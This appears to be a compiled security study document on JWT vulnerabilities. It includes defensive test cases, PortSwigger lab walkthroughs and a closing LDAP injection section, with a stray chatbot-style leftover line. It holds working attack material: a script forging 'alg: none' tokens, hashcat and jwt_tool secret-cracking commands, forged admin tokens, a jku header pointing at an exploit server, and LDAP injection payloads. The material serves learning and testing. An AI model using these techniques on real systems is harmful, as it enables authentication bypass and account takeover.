# JSON Web Token (JWT) Exploitation & SQL Injection Techniques

## JWT - JSON Web Token
JSON Web Token follows the format:
```
Base64(Header).Base64(Data).Base64(Signature)
```
### Example
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY
```
JWT is split into three parts:
- **Header**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
- **Payload**: `eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ`
- **Signature**: `UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

Default algorithm: **HS256** (HMAC SHA256 symmetric encryption). For asymmetric purposes, **RS256** is used.

#### Header Example
```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```
#### Payload Example
```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```
### Exploiting JWT Vulnerabilities
#### Modify JWT Signature to None Algorithm

# 🔐 **JWT Vulnerability Names**

### **1. JWT Signature Validation Bypass**
### **2. JWT “none” Algorithm Acceptance**
### **3. JWT Algorithm Confusion (HS256 ↔ RS256)**
### **4. JWT Weak Signing Key Vulnerability**
### **5. JWT `kid` Header Manipulation**
### **6. JWT Path Traversal via `kid` Header**
### **7. JWT External JWK Injection (`jku`)**
### **8. JWT External Certificate Injection (`x5u`)**
### **9. JWT Header Parameter Injection**
### **10. JWT Claim Tampering**
### **11. JWT Expiration Bypass (`exp`)**
### **12. JWT Issued-In-Future (`iat`) Abuse**
### **13. JWT Not-Before (`nbf`) Misuse**
### **14. JWT Invalid Audience (`aud`) Acceptance**
### **15. JWT Invalid Issuer (`iss`) Acceptance**
### **16. JWT Missing Required Claims**
### **17. JWT Replay Attack (No Revocation / Rotation)**
### **18. JWT Overly Long Token (Token Size DoS)**
### **19. JWT Sensitive Data Exposure in Payload**
### **20. JWT Storage Misconfiguration (localStorage, XSS)**
### **21. JWT Transport Misconfiguration (No HTTPS)**
### **22. JWT Refresh Token Rotation Failure**
### **23. JWT Key Exposure in Logs / Error Messages**
### **24. JWT Weak Randomness in `jti` or IDs**
### **25. JWT Invalid Token Parsing/Deserialization Issues**

---

# 🛡️ **JWT Security Test Cases (Safe Examples Only)**

Each test case includes:

* **Purpose**
* **What to verify**
* **Sample header + payload** (harmless, unsigned, non-exploitable)

---

# ## ✅ **1. Missing Signature / Unverified Signature**

### **Purpose:** Ensure the server rejects unsigned tokens.

### **Expected:** 401 Unauthorized

**Example unsigned JWT:**

```text
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

**Decoded:**

```json
Header:  { "alg": "none" }
Payload: { "user": "admin" }
Signature: (empty)
```

---

# ## ✅ **2. “none” Algorithm Test**

### **Purpose:** Ensure `alg: none` is disabled.

### **Expected:** Reject token.

**Example:**

```json
Header:
{ "alg": "none", "typ": "JWT" }

Payload:
{ "user": "test_user", "role": "admin" }
```

---

# ## ✅ **3. Algorithm Mismatch / Confusion Test (HS256 vs RS256)**

### **Purpose:** Verify server does not auto-switch algorithms.

### **Expected:** Reject mismatched algorithm tokens.

**Example header:**

```json
{ "alg": "HS256", "typ": "JWT" }
```

**Example payload:**

```json
{ "user": "alice", "role": "admin" }
```

*(Signature omitted to ensure safety.)*

---

# ## ✅ **4. Weak Signing Key Test**

### **Purpose:** Ensure server rejects tokens signed with weak HMAC keys.

### **Expected:** Reject or warn.

**Example weak scenario:**

```text
Secret key = "12345"
```

**Test payload:**

```json
{ "user": "test", "exp": 9999999999 }
```

---

# ## ✅ **5. Expired Token**

### **Purpose:** Ensure expiration is enforced.

### **Expected:** Reject token.

**Payload example (expired):**

```json
{
  "user": "bob",
  "exp": 1000000000
}
```

---

# ## ✅ **6. Token Issued in the Future**

### **Purpose:** Ensure `iat` in the future is rejected.

### **Expected:** Reject token.

**Example payload:**

```json
{
  "user": "charlie",
  "iat": 9999999999
}
```

---

# ## ✅ **7. Invalid Audience (`aud`)**

### **Purpose:** Ensure the server validates audience.

### **Expected:** Reject token.

```json
{
  "user": "eve",
  "aud": "unknown-service"
}
```

---

# ## ✅ **8. Invalid Issuer (`iss`)**

### **Purpose:** Verify server enforces strict issuer matching.

### **Expected:** Reject token.

```json
{
  "user": "dave",
  "iss": "fake-issuer"
}
```

---

# ## ✅ **9. Tampered Payload**

### **Purpose:** Server must detect tampering after signature is removed/altered.

### **Expected:** Reject token.

**Original payload:**

```json
{ "user": "frank", "role": "user" }
```

**Tampered payload:**

```json
{ "user": "frank", "role": "admin" }
```

---

# ## ✅ **10. Oversized Token**

### **Purpose:** Identify DoS risk via extremely large payloads.

### **Expected:** Reject or limit token size.

**Example oversized claim block (truncated):**

```json
{
  "user": "test",
  "data": "AAAA....(thousands of characters)....AAAA"
}
```

---

# ## ✅ **11. `kid` Header Manipulation (Safe Example)**

### **Purpose:** Ensure `kid` is sanitized and validated.

### **Expected:** Reject token.

**Header:**

```json
{
  "alg": "HS256",
  "kid": "../../etc/passwd"
}
```

**Payload:**

```json
{ "user": "tester" }
```

*(No signature included.)*

---

# ## ✅ **12. `jku` Header Injection (Safe Example)**

### **Purpose:** Server should block untrusted JWK URLs.

### **Expected:** Reject unless allowlisted.

**Header:**

```json
{
  "alg": "RS256",
  "jku": "http://untrusted.example.com/jwks.json"
}
```

**Payload:**

```json
{ "user": "token_user" }
```

---

# ## ✅ **13. `x5u` External Certificate Fetch (Safe Example)**

### **Purpose:** Ensure strict certificate pinning or URL blocking.

### **Expected:** Reject token.

**Example header:**

```json
{
  "alg": "RS256",
  "x5u": "http://untrusted.example.com/cert.pem"
}
```

**Payload:**

```json
{ "user": "api_user" }
```

---

# ## ✅ **14. Missing Required Claims**

### **Purpose:** Validate presence of all mandatory claims.

### **Expected:** Reject.

**Example payload missing `sub`, `iss`, `aud`:**

```json
{ "user": "test_user" }
```

---

# ## ✅ **15. Replay of Previously Valid Token**

### **Purpose:** Check revocation & refresh token rotation.

### **Expected:** Reject reused/rotated tokens.

**Example payload (conceptual):**

```json
{
  "sub": "12345",
  "jti": "old-revoked-id"
}
```

---

# JWT Labs – PortSwigger

This document consolidates key JWT attack techniques and corresponding labs from PortSwigger's Web Security Academy.([portswigger.net][1])

---

## 1. JWT Authentication Bypass via Unverified Signature

This lab demonstrates a scenario where the server fails to verify the signature of JWTs, allowing attackers to modify token payloads without detection.([portswigger.net][2])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and observe the JWT in the session cookie.
3. Modify the `sub` claim in the payload to `administrator`.
4. Send the modified token to access the admin panel at `/admin`.
5. Delete the user `carlos` to complete the lab.([portswigger.net][3], [portswigger.net][4], [portswigger.net][5], [portswigger.net][2])

**Reference:** [Lab: JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)

---

## 2. JWT Authentication Bypass via "None" Algorithm

In this lab, the server accepts JWTs with the `alg` header parameter set to `none`, effectively disabling signature verification.([portswigger.net][4])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and decode the JWT.
3. Change the `alg` value in the header to `none`.
4. Modify the `sub` claim in the payload to `administrator`.
5. Remove the signature part of the token, leaving the trailing dot.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][6], [portswigger.net][5], [portswigger.net][4], [portswigger.net][3])

**Reference:** [Lab: JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)

---

## 3. JWT Authentication Bypass via Algorithm Confusion

This lab illustrates an algorithm confusion vulnerability where the server uses an RSA key pair but accepts tokens signed with a symmetric algorithm like `HS256`.([portswigger.net][3])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Access the server's public key from the `/jwks.json` endpoint.
3. Convert the public key to a suitable format for signing.
4. Modify the JWT header to use `HS256` and the payload's `sub` claim to `administrator`.
5. Sign the token using the public key as the HMAC secret.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][7], [portswigger.net][3], [portswigger.net][6], [portswigger.net][8], [portswigger.net][2])

**Reference:** [Lab: JWT authentication bypass via algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)

---

## 4. JWT Authentication Bypass via Weak Signing Key

This lab focuses on exploiting weak secret keys used for signing JWTs, which can be brute-forced using tools like hashcat.([portswigger.net][5])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and extract the JWT.
3. Use hashcat with a wordlist to brute-force the secret key.
4. Modify the JWT payload's `sub` claim to `administrator`.
5. Sign the token using the discovered secret key.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][7], [portswigger.net][5])

**Reference:** [Lab: JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)

---

## 5. JWT Authentication Bypass via `kid` Header Path Traversal

This lab demonstrates how the `kid` header parameter can be exploited using path traversal to manipulate the key file used for signature verification.([portswigger.net][6])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and decode the JWT.
3. Modify the `kid` value in the header to a path traversal string pointing to `/dev/null`.
4. Change the payload's `sub` claim to `administrator`.
5. Sign the token using a null byte as the secret.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][6])

**Reference:** [Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)

---

## 6. JWT Authentication Bypass via `jku` Header Injection

In this lab, the server accepts a `jku` header parameter pointing to a JSON Web Key Set (JWKS) URL without proper validation, allowing attackers to supply their own keys.([portswigger.net][8])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Generate a new RSA key pair and host the public key in a JWKS format on an external server.
3. Modify the JWT header to include the `jku` parameter pointing to your JWKS URL and set the `kid` to match your key.
4. Change the payload's `sub` claim to `administrator`.
5. Sign the token using your private key.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][7], [portswigger.net][3], [portswigger.net][1], [portswigger.net][8])

**Reference:** [Lab: JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)

```python
import jwt

jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'

# Decode the token
decodedToken = jwt.decode(jwtToken, verify=False)
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

print(noneEncoded.decode())
```
#### Output:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
```
#### Brute-force JWT Secret Key
```sh
git clone https://github.com/ticarpi/jwt_tool
python2.7 jwt_tool.py <JWT_TOKEN> /tmp/wordlist
```
Reference: [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

### JWT authentication bypass via unverified signature

We can change this JWT in the JSON Web Token extension panel:

![image](https://github.com/user-attachments/assets/da5969c7-811a-489b-b029-ae4ca3d9e371)

Getting the JWT:

```
eyJraWQiOiI0MTZkMDg2Yy00MDdhLTRiYzQtODhhMy00MzAyZTUzMTk1ZTgiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3ODg2MzR9.qmaz_uqHRR06JTx5vtenCveTPOtzi3mG0X1WMJhnKV3AmzlI3Pjceo3Lldu2oLHcP9SEblyJxJJ5hIO3VVAKzWsWGjNw4aN1vZCBhxzcY-MgxuspBc3XpS1_oMeenFcfEn0I4Jlob_YMrZVqQbdp8i1w_SpYLkMOkDaLlgPZk3TwZa1U005YBhHjQrItMBYWRtQDnP4rYnHkTsgwmWRu8RMCirq9-SS9gczbr2YEENZuPrxWphbYwCSMtivcysFOKXEzCvO7juIKqAfE_WmB6qx41I8Wny-qlkbeU3-9VXyIM8iC6opD6wlUiI9S328bjXN_ZFWsuRdaDVyvE4gRXw
```
Then I changed the “Location” header to “/admin”:

![image](https://github.com/user-attachments/assets/b0156e2c-8e35-4ad3-89d4-50aeb6d05608)

Getting access to the admin panel:

![image](https://github.com/user-attachments/assets/89668e77-b8d3-48c5-9ec5-e6b206acf166)

2. **JWT authentication bypass via flawed signature verification**

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.
To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

![image](https://github.com/user-attachments/assets/8a135d4b-a427-48d1-822a-48086d7826db)

![image](https://github.com/user-attachments/assets/4b3faa7e-e5f3-48c9-ad29-b07ddb31377b)

Then delete everything after the second “.” character (that is the signature):

```
eyJraWQiOiIzNjlmMmFjZC1hZTUwLTQ4YzctYTM2Ny04NTczYzllNTc0ZmQiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3ODk4MzB9.
```
![image](https://github.com/user-attachments/assets/fa64c5e8-2c1e-4925-a16c-a45b7b8923bf)

Access the admin panel and delete the user:

![image](https://github.com/user-attachments/assets/5b85ee97-332b-41cb-bc5d-3696e16a5a91)
---
3. **JWT authentication bypass via weak signing key**

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.
To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.
We also recommend using hashcat to brute-force the secret key. For details on how to do this, see Brute forcing secret keys using hashcat.

After logging in we get a signed JWT:

```
eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo
```
![image](https://github.com/user-attachments/assets/a716bb03-fb18-454b-aa1e-b0aeb5919a4f)

Then we try to crack it:

```
hashcat -a 0 -m 16500 "eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo" jwt.secrets.list
```

![image](https://github.com/user-attachments/assets/0bd23181-89f0-49a2-a2b3-b2669756578e)

The cracked value is “secret1”:

![image](https://github.com/user-attachments/assets/854f8a72-32f0-42cc-9743-b7b3909ba967)

I do not understand the JWT extension so I used jwt.io:

![image](https://github.com/user-attachments/assets/39764e8f-a299-4df3-9097-c0698c0b26fc)

Getting the following JWT:
```
eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
```
It is possible to access as the administrator user with that JWT and delete the user:

```
GET /admin/delete?username=carlos HTTP/2
...
Cookie: session=eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
...
```
![image](https://github.com/user-attachments/assets/f82cddc8-322a-4c85-bf1f-a5b59a270458)

# JWT authentication bypass via jwk header injection

This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source. To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

---------------------------------------------
References: 

- https://portswigger.net/web-security/jwt
- 
![image](https://github.com/user-attachments/assets/b37a4fcd-1e69-4eb8-bc6e-60ff12c66e56)
---------------------------------------------

In “JWT Editor Keys”, generate a RSA key:

![image](https://github.com/user-attachments/assets/de2625a0-22d3-4068-ad95-bc4fb5968eb6)

In Repeater, in the “JSON Web Token” tab, click “Attack” and “Embedded JWK”:

![image](https://github.com/user-attachments/assets/7e990b67-ab00-42de-91a0-83ea68b65464)

With this added to the JWT, it is possible to access as administrator:

![image](https://github.com/user-attachments/assets/fad1d07a-f2e9-4386-a8b8-316fc8054838)

# **JWT authentication bypass via jku header injection**

This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.
To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

---------------------------------------------
References: 

- https://portswigger.net/web-security/jwt
- https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c
![image](https://github.com/user-attachments/assets/12324d4b-6142-4f02-9589-d0178114cddf)
---------------------------------------------

It llok like the file “/.well-known/jwks.json” does not exist:

![image](https://github.com/user-attachments/assets/8f919e31-0e34-4ec0-9b73-05a44b69be0d)

First I copied the public key part of the RSA key:

![image](https://github.com/user-attachments/assets/852a1f63-8c75-4c8a-abe4-d80658581448)

And create “/jwks.json” in the exploit server. I added the field "use": "sig":

![image](https://github.com/user-attachments/assets/c54371b1-7c51-4903-baf2-cd084b7e3cc0)
![image](https://github.com/user-attachments/assets/e6fb30e8-7c22-425b-8ea1-a018256009c4)

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
            "n": "zdCdoh120Xnv9C_UywxJX78dtqOyMS42cXfmnjTYEuShgMd4yABQeUuObibikuytdaopdW0PtY1Q2AYOg0H6A4iBbTzRHNaN85IOb5J7mgiHHp7oIjDlQ6wajZsraj3US4hX3TdK3gcEG-h0EWpSh9A34yfq3HCKLdEVbV0XgRmI3N6Nc_VX5aIcGkoALHZBd9g179CfBtvtUu3cFPZA8eC9iv5xv1AyO4IdlOVdKjNernPu94LzzyYlHObHHWj-BaC5Px4J0jDymdPc9HaLm67nlA0aqZ6KA4HwzZHGJEb2UO_-Ya1HCsRhrnz2e2QRPVAOHgQkPWMKJb6vOFU5OQ"
        }
    ]
}
```
Then I created the JWT:

![image](https://github.com/user-attachments/assets/65078e68-5e15-4f30-b574-603bd4bbb698)

Header with:
- The same “kid” as the public key uploaded
- A “jku” value pointing to the file created in the exploit server
```
{
  "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
  "alg": "RS256",
  "jku": "https://exploit-0a3700d5034894e7808139f701b000a7.exploit-server.net/jwks.json"
}
```
Payload with:

- The “sub” value changed to the user administrator

``` 
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1683792794
}
``` 

The JWT:

```
eyJraWQiOiIzNmRiZGEzNi01NTJjLTQzOGItYWM0Yy05ZTM2NWZiNzhlYzUiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTM3MDBkNTAzNDg5NGU3ODA4MTM5ZjcwMWIwMDBhNy5leHBsb2l0LXNlcnZlci5uZXQvandrcy5qc29uIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTI3OTR9.mY28w-Jf8fMZzO_9qNug5rWXMG8bQq-zpuQLmsQnPPjLziXt5vHOESQeZcCs5wZaagVwkXU9IuRW0mvXsM5AwvuCDG1K22XIP_mL2-RNBQpN_qOE1HVJPIdy-Iq0F1V1DgEAYcNo9QQgcxX1AmhW9AQ0urD4qnLGk8leZYX-J4okBw-583qj2NsgX5zPan_JJ0bqupysw1cy8G9eR4h57wV1wM5oOiGhS5fX2gasKq5RSv4TUQ0Rk6FwONnmNhFJMNKn7HYRxGeoDv-A1118w49G6QSDqWsSuuFgCPy2oLQ-TGMDJBBDBGUNNy-serxOKJ7JjkY9qp1sC9E5hekzHQ
``` 
![image](https://github.com/user-attachments/assets/811f91c4-d255-452d-8de1-c10656993ba8)

If done with Burp:
![image](https://github.com/user-attachments/assets/9be23efc-7bfd-4f78-8ea5-95e48ccf6f1f)

## LDAP Injection
LDAP Injection exploits applications that construct LDAP queries based on user input.

### Basic Injection Example
```sh
user  = *)(uid=*))(|(uid=*
pass  = password
query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
```
### Common LDAP Payloads
```sh
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```
Here are **ONLY the testcase names for LDAP Injection**, clean list, no payloads:

---
